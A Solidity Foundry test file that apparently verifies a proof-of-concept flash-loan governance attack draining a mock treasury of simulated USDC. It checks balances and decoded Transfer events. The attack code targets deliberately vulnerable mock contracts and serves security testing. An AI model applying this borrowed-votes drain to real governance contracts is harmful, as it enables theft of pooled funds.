// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2, Vm} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockFlashLender, IFlashBorrower} from "../contracts/mocks/MockFlashLender.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";
import {VulnX100Treasury} from "../contracts/targets/VulnX100Treasury.sol";

contract IndepBot is IFlashBorrower {
    MockFlashLender lender; MockERC20 token; VulnX100Governor gov; uint256 pid;
    constructor(MockFlashLender l, MockERC20 t, VulnX100Governor g) { lender=l; token=t; gov=g; }
    function voteWithLoan(uint256 _pid, uint256 amount) external { pid=_pid; lender.flashLoan(amount); }
    function onFlashLoan(address t, uint256 amount) external {
        gov.castVote(pid, true);
        MockERC20(t).transfer(address(lender), amount);
    }
}

/// INDEPENDENT RE-VERIFICATION of the 5,000,000 USDC vault drain.
/// Checks REAL state via balanceOf, decodes the ERC20 Transfer event log,
/// verifies decimals and the 5e24 raw-unit conversion, and proves the movement
/// is produced by EVM CONTRACT EXECUTION (emitter = token contract; from =
/// treasury contract) — not by any test-side balance manipulation.
contract FundFlowIndependentTest is Test {
    uint256 constant FIVE_MILLION = 5_000_000;
    MockERC20 usdc;
    MockERC20 gt;
    MockFlashLender lender;
    VulnX100Governor gov;
    VulnX100Treasury treasury;
    address attacker = makeAddr("attacker");
    address receiver = makeAddr("receiver");

    bytes32 constant TRANSFER_SIG = keccak256("Transfer(address,address,uint256)");

    function setUp() public {
        usdc = new MockERC20("USD Coin (SIMULATED)", "USDC");
        gt = new MockERC20("X100 Governance", "X100");
        gov = new VulnX100Governor(IVotesLike(address(gt)));
        treasury = new VulnX100Treasury();
        treasury.setGovernor(address(gov));
        gov.setTreasury(address(treasury));
        // The ONLY balance seeding is the ERC20's own mint (a contract call).
        usdc.mint(address(treasury), FIVE_MILLION * (10 ** usdc.decimals()));
        gt.mint(address(lender = new MockFlashLender(gt)), 600_000e18);
        gt.mint(address(0xdead), 400_000e18);
    }

    /// decimals + raw-unit conversion: explain why 5,000,000 USDC == 5e24 raw.
    function test_A_decimals_and_raw_unit_conversion() public view {
        uint8 d = usdc.decimals();
        assertEq(d, 18, "USDC mock uses 18 decimals");
        uint256 raw = FIVE_MILLION * (10 ** d);
        assertEq(raw, 5_000_000_000_000_000_000_000_000, "5,000,000 * 10^18 == 5e24");
        assertEq(raw, 5e24, "scientific-notation 5e24 equals the integer");
        assertEq(usdc.totalSupply(), raw, "total minted supply == 5e24 raw units");
        console2.log("decimals:", d);
        console2.log("human USDC:", FIVE_MILLION);
        console2.log("raw units :", raw); // 5000000000000000000000000
    }

    /// Real balanceOf state + decoded Transfer event, from contract execution.
    function test_B_drain_moves_real_balances_via_contract() public {
        uint256 raw = FIVE_MILLION * (10 ** usdc.decimals());

        // Snapshot REAL state (balanceOf), not console/events.
        uint256 vaultBefore = usdc.balanceOf(address(treasury));
        uint256 recvBefore = usdc.balanceOf(receiver);
        assertEq(vaultBefore, raw, "pre: vault balanceOf == 5e24");
        assertEq(recvBefore, 0, "pre: receiver balanceOf == 0");

        // Build + pass the drain proposal using the vulnerable governance path.
        bytes memory drain = abi.encodeWithSignature("transfer(address,uint256)", receiver, raw);
        vm.prank(attacker);
        uint256 id = gov.propose(address(usdc), 0, drain);
        IndepBot bot = new IndepBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, 600_000e18);
        (, , , , uint64 deadline, ) = gov.proposalInfo(id);
        vm.warp(deadline + 1);

        // Record logs ONLY around the on-chain execution.
        vm.recordLogs();
        gov.execute(id);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Find the USDC Transfer(treasury -> receiver, raw) emitted BY the token.
        bool found;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].emitter == address(usdc)
                && logs[i].topics.length == 3
                && logs[i].topics[0] == TRANSFER_SIG
                && address(uint160(uint256(logs[i].topics[1]))) == address(treasury)
                && address(uint160(uint256(logs[i].topics[2]))) == receiver) {
                uint256 value = abi.decode(logs[i].data, (uint256));
                assertEq(value, raw, "Transfer event value == 5e24");
                found = true;
            }
        }
        assertTrue(found, "decoded ERC20 Transfer(treasury->receiver, 5e24) present");

        // REAL post-state via balanceOf.
        uint256 vaultAfter = usdc.balanceOf(address(treasury));
        uint256 recvAfter = usdc.balanceOf(receiver);
        assertEq(vaultAfter, 0, "post: vault balanceOf == 0");
        assertEq(recvAfter, raw, "post: receiver balanceOf == 5e24");
        // Delta accounting proves the event value == the balance change.
        assertEq(recvAfter - recvBefore, raw, "receiver delta == 5e24");
        assertEq(vaultBefore - vaultAfter, raw, "vault delta == 5e24");

        // Conservation across all holders.
        uint256 sum = usdc.balanceOf(address(treasury)) + usdc.balanceOf(receiver)
            + usdc.balanceOf(attacker) + usdc.balanceOf(address(gov)) + usdc.balanceOf(address(this));
        assertEq(sum, usdc.totalSupply(), "conservation: sum == totalSupply");

        console2.log("vault  before/after:", vaultBefore, vaultAfter);
        console2.log("recv   before/after:", recvBefore, recvAfter);
    }

    /// Proof-by-contradiction that funds move via EVM execution: with the
    /// vulnerable governor NOT wired (no execute call), balances do NOT change.
    function test_C_no_execution_means_no_movement() public {
        uint256 raw = FIVE_MILLION * (10 ** usdc.decimals());
        // propose + vote but DO NOT execute -> no contract call moves funds.
        bytes memory drain = abi.encodeWithSignature("transfer(address,uint256)", receiver, raw);
        vm.prank(attacker);
        uint256 id = gov.propose(address(usdc), 0, drain);
        IndepBot bot = new IndepBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, 600_000e18);
        // No gov.execute(id) here.
        assertEq(usdc.balanceOf(address(treasury)), raw, "without execution, vault unchanged");
        assertEq(usdc.balanceOf(receiver), 0, "without execution, receiver still 0");
    }
}
